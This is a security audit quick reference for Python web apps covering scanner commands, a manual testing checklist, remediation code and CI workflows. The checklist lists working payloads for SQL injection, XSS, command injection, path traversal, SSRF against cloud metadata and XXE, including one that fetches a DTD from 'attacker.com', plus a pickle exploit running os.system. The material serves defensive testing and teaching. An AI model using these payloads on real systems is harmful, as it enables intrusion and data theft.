# Security Audit Toolkit - Quick Reference

## Automated Scanning Commands

### 1. Bandit (Python SAST)
```bash
# Install
pip install bandit

# Run scan
bandit -r app.py -f json -o bandit-report.json
bandit -r app.py -lll  # Only high/medium severity
bandit -r app.py --skip B101,B601  # Skip specific tests
```

### 2. Semgrep (Pattern-based)
```bash
# Install
pip install semgrep

# Run with auto rules
semgrep --config=auto app.py --json=semgrep-report.json

# Specific rule sets
semgrep --config=p/python app.py
semgrep --config=p/secrets app.py
semgrep --config=p/ci app.py
```

### 3. Safety (Dependency Scanning)
```bash
# Install
pip install safety

# Check dependencies
safety check --json
safety check --ignore=12345  # Ignore specific CVE
```

### 4. pip-audit (Modern Dependency Scanning)
```bash
# Install
pip install pip-audit

# Scan
pip-audit --format=json -o pip-audit-report.json
pip-audit --desc  # Include descriptions
```

### 5. Trivy (Container/Filesystem Scanning)
```bash
# Install
# https://aquasecurity.github.io/trivy/

# Scan filesystem
trivy fs --security-checks vuln,secret,config .

# Scan Docker image
trivy image python:3.11
```

---

## Manual Testing Checklist

### SQL Injection Testing
```bash
# Test endpoints with these payloads:
' OR '1'='1
' UNION SELECT null,username,password FROM users--
'; DROP TABLE users;--
1' AND (SELECT COUNT(*) FROM users)>0--
admin'--
' OR SLEEP(5)--
```

### XSS Testing
```html
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(1)
<iframe src=javascript:alert(1)>
<body onload=alert(1)>
```

### Command Injection Testing
```bash
; cat /etc/passwd
| cat /etc/passwd
`cat /etc/passwd`
$(cat /etc/passwd)
|| cat /etc/passwd
&& cat /etc/passwd
; sleep 10
```

### Path Traversal Testing
```
../../etc/passwd
..\windows\system32\drivers\etc\hosts
%2e%2e%2f%2e%2e%2fetc%2fpasswd
....//....//etc/passwd
```

### SSRF Testing
```
http://localhost:8080
http://127.0.0.1:22
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/
file:///etc/passwd
dict://localhost:11211/stat
```

### XXE Testing
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
<foo>test</foo>
```

### Deserialization Testing (Pickle)
```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('cat /etc/passwd',))

payload = pickle.dumps(Exploit())
print(payload.hex())
```

---

## Remediation Code Examples

### 1. Secure Database Queries
```python
# ❌ VULNERABLE
query = f"SELECT * FROM users WHERE username = '{username}'"

# ✅ SECURE - Parameterized Query
query = "SELECT * FROM users WHERE username = ?"
cursor.execute(query, (username,))

# ✅ SECURE - Named Parameters
query = "SELECT * FROM users WHERE username = :username"
cursor.execute(query, {"username": username})

# ✅ SECURE - SQLAlchemy ORM
user = User.query.filter_by(username=username).first()
```

### 2. Secure Command Execution
```python
# ❌ VULNERABLE
cmd = f"ping -c 4 {host}"
subprocess.run(cmd, shell=True)

# ✅ SECURE - No shell, argument list
import shlex
cmd = ['ping', '-c', '4', host]
result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)

# ✅ SECURE - Input validation + no shell
import ipaddress
def validate_host(host):
    try:
        ipaddress.ip_address(host)
        return True
    except ValueError:
        # Allow hostnames with strict validation
        import re
        return bool(re.match(r'^[a-zA-Z0-9.-]+$', host))
```

### 3. Secure File Operations
```python
# ❌ VULNERABLE
filepath = os.path.join('/app/uploads', filename)

# ✅ SECURE - Path validation
from werkzeug.utils import secure_filename
import os

UPLOAD_FOLDER = '/app/uploads'

def safe_filepath(filename):
    filename = secure_filename(filename)
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    filepath = os.path.normpath(filepath)
    
    if not filepath.startswith(os.path.abspath(UPLOAD_FOLDER)):
        raise ValueError("Path traversal attempt")
    return filepath
```

### 4. Secure Deserialization
```python
# ❌ VULNERABLE
obj = pickle.loads(user_data)

# ✅ SECURE - Use JSON
import json
obj = json.loads(user_data)

# ✅ SECURE - If pickle required, use restricted unpickler
import io
class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module not in {'builtins', 'datetime'}:
            raise pickle.UnpicklingError(f"Forbidden: {module}.{name}")
        return super().find_class(module, name)

def safe_unpickle(data):
    return RestrictedUnpickler(io.BytesIO(data)).load()
```

### 5. Secure XML Parsing
```python
# ❌ VULNERABLE
root = ET.fromstring(xml_data)

# ✅ SECURE - Disable external entities
def safe_xml_parse(xml_data):
    parser = ET.XMLParser()
    parser.entity = lambda name: ''  # Disable entities
    return ET.fromstring(xml_data, parser=parser)

# Alternative: defusedxml
from defusedxml import ElementTree as SafeET
root = SafeET.fromstring(xml_data)
```

### 6. SSRF Protection
```python
# ✅ SECURE - URL validation
import ipaddress
from urllib.parse import urlparse

PRIVATE_RANGES = [
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('169.254.0.0/16'),  # Link-local
]

def is_safe_url(url):
    parsed = urlparse(url)
    if parsed.scheme not in ('http', 'https'):
        return False
    
    try:
        ip = ipaddress.ip_address(parsed.hostname)
        for private in PRIVATE_RANGES:
            if ip in private:
                return False
    except ValueError:
        # Hostname - resolve and check
        import socket
        try:
            ip = socket.gethostbyname(parsed.hostname)
            ip_obj = ipaddress.ip_address(ip)
            for private in PRIVATE_RANGES:
                if ip_obj in private:
                    return False
        except socket.gaierror:
            return False
    
    return True
```

### 7. Secure Password Handling
```python
# ❌ VULNERABLE
cursor.execute(f"INSERT INTO users (password) VALUES ('{password}')")

# ✅ SECURE - bcrypt
from werkzeug.security import generate_password_hash, check_password_hash

def hash_password(password):
    return generate_password_hash(password, method='pbkdf2:sha256:5000', salt_length=12)

def verify_password(password, hash):
    return check_password_hash(hash, password)

# Or use bcrypt directly
import bcrypt
hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
bcrypt.checkpw(password.encode(), hash)
```

### 8. CSRF Protection
```python
# ✅ SECURE - Flask-WTF CSRF
from flask_wtf.csrf import CSRFProtect

app = Flask(__name__)
csrf = CSRFProtect(app)

# Or manual token validation
import secrets
session['csrf_token'] = secrets.token_hex(32)

@app.route('/change_password', methods=['POST'])
def change_password():
    if request.form.get('csrf_token') != session.get('csrf_token'):
        abort(403)
    # ... process request
```

### 9. Secure File Upload
```python
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'pdf'}
MAX_FILE_SIZE = 5 * 1024 * 1024  # 5MB

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route('/upload', methods=['POST'])
def upload_file():
    file = request.files.get('file')
    if not file or file.filename == '':
        return 'No file', 400
    
    if not allowed_file(file.filename):
        return 'Invalid file type', 400
    
    if request.content_length > MAX_FILE_SIZE:
        return 'File too large', 400
    
    filename = secure_filename(file.filename)
    filepath = safe_filepath(filename)
    file.save(filepath)
    return 'Uploaded successfully'
```

### 10. Security Headers Middleware
```python
from flask import Flask
from flask_talisman import Talisman

app = Flask(__name__)

# ✅ SECURE - Talisman for security headers
csp = {
    'default-src': "'self'",
    'script-src': "'self' 'unsafe-inline'",
    'style-src': "'self' 'unsafe-inline'",
    'img-src': "'self' data: https:",
    'font-src': "'self'",
    'connect-src': "'self'",
    'frame-ancestors': "'none'",
}

Talisman(app, 
    content_security_policy=csp,
    force_https=True,
    strict_transport_security=True,
    session_cookie_secure=True,
    session_cookie_httponly=True,
    session_cookie_samesite='Lax',
    referrer_policy='strict-origin-when-cross-origin',
)
```

---

## CI/CD Integration

### GitHub Actions Workflow
```yaml
# .github/workflows/security.yml
name: Security Scan

on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'
      
      - name: Install dependencies
        run: |
          pip install bandit semgrep safety pip-audit
      
      - name: Run Bandit
        run: bandit -r . -f json -o bandit-report.json || true
      
      - name: Run Semgrep
        run: semgrep --config=auto . --json=semgrep-report.json || true
      
      - name: Run Safety
        run: safety check --json --output safety-report.json || true
      
      - name: Run pip-audit
        run: pip-audit --format=json -o pip-audit-report.json || true
      
      - name: Upload reports
        uses: actions/upload-artifact@v4
        with:
          name: security-reports
          path: *-report.json
```

### Pre-commit Hooks
```yaml
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/PyCQA/bandit
    rev: 1.7.5
    hooks:
      - id: bandit
        args: ['-r', '.', '-ll']
  
  - repo: https://github.com/returntocorp/semgrep
    rev: v1.45.0
    hooks:
      - id: semgrep
        args: ['--config=auto']
  
  - repo: https://github.com/pycqa/pylint
    rev: v2.17.0
    hooks:
      - id: pylint
```

---

## Quick Reference: Vulnerability → Fix Mapping

| Vulnerability | Primary Fix | Secondary Defense |
|--------------|-------------|-------------------|
| SQL Injection | Parameterized queries | Input validation, WAF |
| XSS | Output encoding + CSP | Input validation, HttpOnly cookies |
| CSRF | CSRF tokens | SameSite cookies, referer check |
| Command Injection | No shell=True, allowlist | Input validation, least privilege |
| Path Traversal | secure_filename + path validation | Chroot/jail, least privilege |
| XXE | Disable external entities | Use defusedxml |
| SSRF | URL validation, private IP blocking | Network segmentation, egress filtering |
| Insecure Deserialization | Use JSON, safe_load | Signed serialization, schema validation |
| Broken Auth | bcrypt, MFA, secure sessions | Rate limiting, account lockout |
| Sensitive Data Exposure | Encryption, no logging secrets | Data classification, DLP |

---

## Emergency Response: If Vulnerability Found in Production

1. **Assess** - Determine severity and exploitability
2. **Contain** - Apply WAF rules, disable affected endpoint
3. **Patch** - Implement fix in development
4. **Test** - Verify fix doesn't break functionality
5. **Deploy** - Emergency release with fix
6. **Monitor** - Watch for exploitation attempts
7. **Post-mortem** - Document root cause and prevention

---

*Keep this reference updated with new vulnerability patterns and tool versions.*